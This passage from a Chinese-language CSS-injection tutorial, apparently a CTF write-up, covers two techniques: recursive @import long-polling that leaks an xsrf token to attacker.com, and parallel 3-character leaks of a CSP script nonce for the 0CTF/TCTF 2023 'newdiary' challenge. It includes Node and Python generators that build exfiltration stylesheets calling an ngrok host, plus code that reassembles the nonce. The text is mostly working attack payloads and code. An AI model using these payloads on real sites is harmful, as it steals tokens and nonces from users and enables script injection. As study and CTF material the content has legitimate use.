开始对恶意有效负载进行长轮询</li><li>有效负载导致浏览器调用 <code>usingbackground-img: url(...)</code> 导致生成下一个长轮询 <code>@import</code> 规则并将其返回给浏览器。</li></ol><p><img src="image-4.png" alt="image-4.png"></p><h3 id="7-4-递归导入示例"><a href="#7-4-递归导入示例" class="headerlink" title="7.4 递归导入示例"></a>7.4 递归导入示例</h3><p>假设 <code>token</code> 长度为 32 个字符</p><h4 id="7-4-1-有效载荷示例"><a href="#7-4-1-有效载荷示例" class="headerlink" title="7.4.1 有效载荷示例"></a>7.4.1 有效载荷示例</h4><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css"><span class="token atrule"><span class="token rule">@import</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>http://attacker.com/staging?len=32<span class="token punctuation">)</span></span><span class="token punctuation">;</span></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></code></pre><h4 id="7-4-2-步骤示例"><a href="#7-4-2-步骤示例" class="headerlink" title="7.4.2 步骤示例"></a>7.4.2 步骤示例</h4><pre class="language-markup" data-language="markup"><code class="language-markup">@import url(http://attacker.com/lp?len=0);@import url(http://attacker.com/lp?len=1);@import url(http://attacker.com/lp?len=2);...@import url(http://attacker.com/lp?len=31);</code></pre><h4 id="7-4-3-长轮询有效负载（第0位）示例"><a href="#7-4-3-长轮询有效负载（第0位）示例" class="headerlink" title="7.4.3 长轮询有效负载（第0位）示例"></a>7.4.3 长轮询有效负载（第0位）示例</h4><pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">input[name=xsrf][value^=a]</span> <span class="token punctuation">&#123;</span> <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>http://attacker.com/exfil?t=a<span class="token punctuation">)</span></span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token selector">input[name=xsrf][value^=b]</span> <span class="token punctuation">&#123;</span> <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>http://attacker.com/exfil?t=b<span class="token punctuation">)</span></span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token selector">input[name=xsrf][value^=c]</span> <span class="token punctuation">&#123;</span> <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>http://attacker.com/exfil?t=c<span class="token punctuation">)</span></span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token selector">...input[name=xsrf][value^=Z]</span> <span class="token punctuation">&#123;</span> <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>http://attacker.com/exfil?t=Z<span class="token punctuation">)</span></span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span></code></pre><p>浏览器调用<code>http://attacker.com/exfil?t=&lt;first char of token&gt;</code>后，<br><code>attacker.com</code> 记录 <code>token</code> ，<br>生成下一个长轮询负载，并返回<code>http://attacaker.com/lp?len=1</code>的响应。</p><h4 id="7-4-4-长轮询有效负载（第-1-s-位）示例"><a href="#7-4-4-长轮询有效负载（第-1-s-位）示例" class="headerlink" title="7.4.4 长轮询有效负载（第 1-s 位）示例"></a>7.4.4 长轮询有效负载（第 1-s 位）示例</h4><blockquote><p>在当前状态下 第 0-s-1 个字符 已知</p></blockquote><pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">input[name=xsrf][value^=sa]</span> <span class="token punctuation">&#123;</span> <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>http://attacker.com/exfil?t=sa<span class="token punctuation">)</span></span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token selector">input[name=xsrf][value^=sb]</span> <span class="token punctuation">&#123;</span> <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>http://attacker.com/exfil?t=sb<span class="token punctuation">)</span></span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token selector">input[name=xsrf][value^=sc]</span> <span class="token punctuation">&#123;</span> <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>http://attacker.com/exfil?t=sc<span class="token punctuation">)</span></span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token selector">...input[name=xsrf][value^=sZ]</span> <span class="token punctuation">&#123;</span> <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>http://attacker.com/exfil?t=sZ<span class="token punctuation">)</span></span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span></code></pre><p>重复此过程，直到不再有长轮询连接打开。</p><h3 id="7-5-递归导入工具"><a href="#7-5-递归导入工具" class="headerlink" title="7.5 递归导入工具"></a>7.5 递归导入工具</h3><p><a href="https://github.com/d0nutptr/sic">https://github.com/d0nutptr/sic</a></p><h3 id="7-6-注意事项"><a href="#7-6-注意事项" class="headerlink" title="7.6 注意事项"></a>7.6 注意事项</h3><h4 id="7-6-1-请求数量限制问题"><a href="#7-6-1-请求数量限制问题" class="headerlink" title="7.6.1 请求数量限制问题"></a>7.6.1 请求数量限制问题</h4><p>由于浏览器对于同一个 domain 能同时载入的请求数量有限制，<br>如果在注入时出现请求丢失的情况，可以将 background-imageurl 设置为另一个二级域名 (如 a.attacker.com 等)</p><h4 id="7-6-2-Firefox-特殊处理"><a href="#7-6-2-Firefox-特殊处理" class="headerlink" title="7.6.2 Firefox 特殊处理"></a>7.6.2 Firefox 特殊处理</h4><p>在 Firefox 上对于 @import 的处理有些特殊，就算第一个的请求先返回，<br>也不会立刻更新style，要等所有request 都回来才会一起更新。<br>如果 xssbot 使用的是 Firefox ，则需要对 payload 做如下特殊处理：</p><pre class="language-none"><code class="language-none">&lt;style&gt;@import url(https:&#x2F;&#x2F;myserver.com&#x2F;payload?len&#x3D;1)&lt;&#x2F;style&gt;&lt;style&gt;@import url(https:&#x2F;&#x2F;myserver.com&#x2F;payload?len&#x3D;2)&lt;&#x2F;style&gt;&lt;style&gt;@import url(https:&#x2F;&#x2F;myserver.com&#x2F;payload?len&#x3D;3)&lt;&#x2F;style&gt;&lt;style&gt;@import url(https:&#x2F;&#x2F;myserver.com&#x2F;payload?len&#x3D;4)&lt;&#x2F;style&gt;&lt;style&gt;@import url(https:&#x2F;&#x2F;myserver.com&#x2F;payload?len&#x3D;5)&lt;&#x2F;style&gt;&lt;style&gt;@import url(https:&#x2F;&#x2F;myserver.com&#x2F;payload?len&#x3D;6)&lt;&#x2F;style&gt;&lt;style&gt;@import url(https:&#x2F;&#x2F;myserver.com&#x2F;payload?len&#x3D;7)&lt;&#x2F;style&gt;&lt;style&gt;@import url(https:&#x2F;&#x2F;myserver.com&#x2F;payload?len&#x3D;8)&lt;&#x2F;style&gt;</code></pre><p>由于 Chrome 也支持以上写法，所以建议使用以上写法来同时支持两种 xssbot</p><h2 id="8-并行泄露组合"><a href="#8-并行泄露组合" class="headerlink" title="8. 并行泄露组合"></a>8. 并行泄露组合</h2><p>当目标页面通过 CSP 限制了 <code>style-src</code> 时，<br>我们将无法使用 @import递归导入 引入外部样式表<br>但在 Black Hat Asia 2023 中首次提到了关于并行泄露组合的方法<br>在本文中我将以 0CTF&#x2F;TCTF 2023 - newdiary 一题介绍本方法的使用</p><p>本题中的 CSP 策略如下：</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span>    <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>script-src 'nonce-&lt;%= nonce %>'; frame-src 'none'; object-src 'none'; base-uri 'self'; style-src 'unsafe-inline' https://unpkg.com<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><p>由于 CSP 中使用了 <code>style-src https://unpkg.com</code>，而 unpkg 仅为 npm 的一个 cdn，<br>因此此处可以认为是允许任何的外部 style，但无法使用 @import 进行递归导入。</p><p>而又因为 CSP 中设置了 Script 的 nonce，仅有携带相应 nonce 属性和值的代码会被执行，<br>因此在本题中我们要使用 CSS Injection 来窃取页面中的 nonce</p><h3 id="8-1-nonce-切割"><a href="#8-1-nonce-切割" class="headerlink" title="8.1 nonce 切割"></a>8.1 nonce 切割</h3><p>我们通过将目标 nonce 切割成多个可能值较少的小块，并不立即泄露出整个 nonce，<br>而是并行泄露所有长为 3 字符的 nonce 连续子串，<br>例如，对于 <code>8c2a19fa-8dcd-44d1-807c-1c65abef0251</code> ，我们可以这样操作：</p><p><img src="image-5.png" alt="image-5.png"></p><h3 id="8-2-解决属性覆盖问题"><a href="#8-2-解决属性覆盖问题" class="headerlink" title="8.2 解决属性覆盖问题"></a>8.2 解决属性覆盖问题</h3><h4 id="8-2-1-利用-cross-fade-函数"><a href="#8-2-1-利用-cross-fade-函数" class="headerlink" title="8.2.1 利用 cross-fade() 函数"></a>8.2.1 利用 cross-fade() 函数</h4><blockquote><p>cross-fade() CSS 函数使用多个图像和百分比的组合作为参数，并返回叠加两个图像后所产生的图像<br>如果省略任何百分比，则将100%减去所有指定的百分比的和，如果结果大于 0%，则结果将平均分配给所有图像。</p></blockquote><p>通过利用 cross-fade() 函数，我们可以避免同一属性被最后一个设定覆盖而导致仅有最后一个设定被请求的问题<br>Payload 如下：</p><pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">img[src*="abc"]</span> <span class="token punctuation">&#123;</span> <span class="token property">--abc</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token string url">"//attacker.com/abc"</span><span class="token punctuation">)</span></span> <span class="token punctuation">&#125;</span><span class="token selector">img[src*="bcd"]</span> <span class="token punctuation">&#123;</span> <span class="token property">--bcd</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token string url">"//attacker.com/bcd"</span><span class="token punctuation">)</span></span> <span class="token punctuation">&#125;</span><span class="token comment">/* ... */</span><span class="token selector">img</span> <span class="token punctuation">&#123;</span>    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token function">cross-fade</span><span class="token punctuation">(</span>        <span class="token function">cross-fade</span><span class="token punctuation">(</span><span class="token function">var</span><span class="token punctuation">(</span>--abc<span class="token punctuation">,</span> none<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">var</span><span class="token punctuation">(</span>--bcd<span class="token punctuation">,</span> none<span class="token punctuation">)</span><span class="token punctuation">,</span> 50%<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token function">cross-fade</span><span class="token punctuation">(</span><span class="token comment">/* ... */</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        50%    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>生成 Payload 代码如下：</p><pre class="language-none"><code class="language-none">const fs &#x3D; require(&#39;fs&#39;)let chars &#x3D; &#39;abcdefghijklmnopqrstuvwxyz0123456789&#39;const host &#x3D; &#39;https:&#x2F;&#x2F;ip.ngrok-free.app&#39;let arr &#x3D; []for(let a of chars) &#123;    for(let b of chars) &#123;        for(let c of chars) &#123;            let str &#x3D; a+b+c;            arr.push(str)        &#125;    &#125;&#125;let payload1 &#x3D; &#39;&#39;let crossPayload1 &#x3D; &#39;url(&quot;&#x2F;&quot;)&#39;let payload2 &#x3D; &#39;&#39;let crossPayload2 &#x3D; &#39;url(&quot;&#x2F;&quot;)&#39;let payload3 &#x3D; &#39;&#39;let crossPayload3 &#x3D; &#39;url(&quot;&#x2F;&quot;)&#39;const third &#x3D; Math.floor(arr.length &#x2F; 3);const arr1 &#x3D; arr.slice(0, third); const arr2 &#x3D; arr.slice(third, 2 * third); const arr3 &#x3D; arr.slice(2 * third); for(let str of arr1) &#123;    payload1 +&#x3D; &#96;script[nonce*&#x3D;&quot;$&#123;str&#125;&quot;]&#123;--$&#123;str&#125;:url(&quot;$&#123;host&#125;&#x2F;leak?q&#x3D;$&#123;str&#125;&quot;)&#125;\n&#96;    crossPayload1 &#x3D; &#96;-webkit-cross-fade($&#123;crossPayload1&#125;, var(--$&#123;str&#125;, none), 50%)&#96;&#125;for(let str of arr2) &#123;    payload2 +&#x3D; &#96;script[nonce*&#x3D;&quot;$&#123;str&#125;&quot;]&#123;--$&#123;str&#125;:url(&quot;$&#123;host&#125;&#x2F;leak?q&#x3D;$&#123;str&#125;&quot;)&#125;\n&#96;    crossPayload2 &#x3D; &#96;-webkit-cross-fade($&#123;crossPayload2&#125;, var(--$&#123;str&#125;, none), 50%)&#96;&#125;for(let str of arr3) &#123;    payload3 +&#x3D; &#96;script[nonce*&#x3D;&quot;$&#123;str&#125;&quot;]&#123;--$&#123;str&#125;:url(&quot;$&#123;host&#125;&#x2F;leak?q&#x3D;$&#123;str&#125;&quot;)&#125;\n&#96;    crossPayload3 &#x3D; &#96;-webkit-cross-fade($&#123;crossPayload3&#125;, var(--$&#123;str&#125;, none), 50%)&#96;&#125;payload1 &#x3D; &#96;$&#123;payload1&#125; script&#123;display:block;&#125; script&#123;background-image: $&#123;crossPayload1&#125;&#125;&#96;payload2 &#x3D; &#96;$&#123;payload2&#125;script:after&#123;content:&#39;a&#39;;display:block;background-image:$&#123;crossPayload2&#125; &#125;&#96;payload3 &#x3D; &#96;$&#123;payload3&#125;script:before&#123;content:&#39;a&#39;;display:block;background-image:$&#123;crossPayload3&#125; &#125;&#96;fs.writeFileSync(&#39;exp1.css&#39;, payload1, &#39;utf-8&#39;);fs.writeFileSync(&#39;exp2.css&#39;, payload2, &#39;utf-8&#39;);fs.writeFileSync(&#39;exp3.css&#39;, payload3, &#39;utf-8&#39;);</code></pre><p>这题如果把全部规则都套在同一个元素上，似乎会因为规则太多之类的让 Chrome 直接crash，<br>（不过不影响最终请求的发送）<br>所以需要把把规则分为三份，顺便套在三个不同元素上。</p><h4 id="8-2-2-使用-var-变量法"><a href="#8-2-2-使用-var-变量法" class="headerlink" title="8.2.2 使用 var 变量法"></a>8.2.2 使用 var 变量法</h4><p>Payload：</p><pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">:has(script[nonce*="aaa"])</span><span class="token punctuation">&#123;</span><span class="token property">--tosend-aaa</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>...?x=aaa<span class="token punctuation">)</span></span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">:has(script[nonce*="aab"])</span><span class="token punctuation">&#123;</span><span class="token property">--tosend-aab</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>...?x=aab<span class="token punctuation">)</span></span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">:has(script[nonce*="aac"])</span><span class="token punctuation">&#123;</span><span class="token property">--tosend-aac</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>...?x=aac<span class="token punctuation">)</span></span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">[...]input</span><span class="token punctuation">&#123;</span>    <span class="token property">background</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--tosend-aaa<span class="token punctuation">,</span> none<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">var</span><span class="token punctuation">(</span>--tosend-aab<span class="token punctuation">,</span> none<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">var</span><span class="token punctuation">(</span>--tosend-aac<span class="token punctuation">,</span> none<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">var</span><span class="token punctuation">(</span>--tosend-aad<span class="token punctuation">,</span> none<span class="token punctuation">)</span><span class="token punctuation">,</span>    [...]<span class="token punctuation">&#125;</span></code></pre><p>生成 Payload 代码如下：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> itertoolscharset <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz0123456789"</span>perms <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">,</span> itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span>charset<span class="token punctuation">,</span> repeat<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"leak.css"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">for</span> i<span class="token punctuation">,</span> x <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>perms<span class="token punctuation">)</span><span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f""":has(script[nonce*="</span><span class="token interpolation"><span class="token punctuation">&#123;</span>x<span class="token punctuation">&#125;</span></span><span class="token string">"])&#123;&#123;--tosend-</span><span class="token interpolation"><span class="token punctuation">&#123;</span>x<span class="token punctuation">&#125;</span></span><span class="token string">: url(https://25de-37-160-34-111.ngrok-free.app/?x=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>x<span class="token punctuation">&#125;</span></span><span class="token string">);&#125;&#125;"""</span></span><span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"loading"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> perms<span class="token punctuation">:</span>        data <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"var(--tosend-</span><span class="token interpolation"><span class="token punctuation">&#123;</span>x<span class="token punctuation">&#125;</span></span><span class="token string">, none),"</span></span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"done"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"writing"</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">"""input&#123;background: %s&#125;"""</span> <span class="token operator">%</span> data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h3 id="8-3-nonce-复原"><a href="#8-3-nonce-复原" class="headerlink" title="8.3 nonce 复原"></a>8.3 nonce 复原</h3><h4 id="8-3-1-复原原理"><a href="#8-3-1-复原原理" class="headerlink" title="8.3.1 复原原理"></a>8.3.1 复原原理</h4><ol><li>找到开头的长为三个字符的子串（即开头的两个字符匹配不到剩余子串末尾的两个字符的子串）</li><li>通过已知 nonce 部分末尾的两个字符与剩余子串的开头两个字符的匹配来连接 nonce 子串</li><li>重复步骤 2 直到所有子串被连接完毕</li><li>还原整个 nonce</li></ol><h4 id="8-3-2-JavaScript-实现"><a href="#8-3-2-JavaScript-实现" class="headerlink" title="8.3.2 JavaScript 实现"></a>8.3.2 JavaScript 实现</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">mergeWords</span><span class="token punctuation">(</span><span class="token parameter">arr<span class="token punctuation">,</span> ending</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> ending  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ending<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">let</span> isFound <span class="token operator">=</span> <span class="token boolean">false</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">===</span> j<span class="token punctuation">)</span> <span class="token keyword">continue</span>        <span class="token keyword">let</span> suffix <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>         <span class="token keyword">let</span> prefix <span class="token operator">=</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>suffix <span class="token operator">===</span> prefix<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          isFound <span class="token operator">=</span> <span class="token boolean">true</span>          <span class="token keyword">continue</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>isFound<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'ending:'</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token function">mergeWords</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">item</span> <span class="token operator">=></span> item<span class="token operator">!==</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Error, please try again'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">let</span> found <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> length <span class="token operator">=</span> ending<span class="token punctuation">.</span>length    <span class="token keyword">let</span> suffix <span class="token operator">=</span> ending<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> ending<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">let</span> prefix <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>suffix <span class="token operator">===</span> prefix<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      found<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">[</span>arr<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">item</span> <span class="token operator">=></span> item<span class="token operator">!==</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> ending<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> found<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">mergeWords</span><span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> item<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre><h4 id="8-3-3-Python-实现"><a href="#8-3-3-Python-实现" class="headerlink" title="8.3.3 Python 实现"></a>8.3.3 Python 实现</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">retrieveNonce</span><span class="token punctuation">(</span>nonce_substr<span class="token operator">=</span>nonce_substr<span class="token punctuation">,</span> force<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># find the beginning of the nonce (there is no match for start)</span>    new_substr <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>nonce_substr<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>new_substr<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">30</span> <span class="token keyword">and</span> <span class="token keyword">not</span> force<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"different length of new_substr [</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>new_substr<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">] - aborting"</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0</span>    backup <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    nonce <span class="token operator">=</span> <span class="token string">''</span>    remove_i <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>new_substr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        start_i <span class="token operator">=</span> new_substr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span>        left <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>new_substr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            end_j <span class="token operator">=</span> new_substr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> i <span class="token operator">!=</span> j<span class="token punctuation">:</span>                <span class="token keyword">if</span> start_i <span class="token operator">==</span> end_j<span class="token punctuation">:</span>                    left <span class="token operator">=</span> <span class="token number">1</span>                    <span class="token keyword">break</span>        <span class="token keyword">if</span> left <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token comment"># beginning</span>            remove_i <span class="token operator">=</span> i            nonce <span class="token operator">=</span> new_substr<span class="token punctuation">[</span>i<span class="token punctuation">]</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>nonce<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"no beginning - aborting"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>nonce<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        new_substr <span class="token operator">=</span> new_substr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>remove_i<span class="token punctuation">]</span> <span class="token operator">+</span> new_substr<span class="token punctuation">[</span>remove_i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token comment"># print("new substr: " + str(new_substr))</span>        found <span class="token operator">=</span> <span class="token 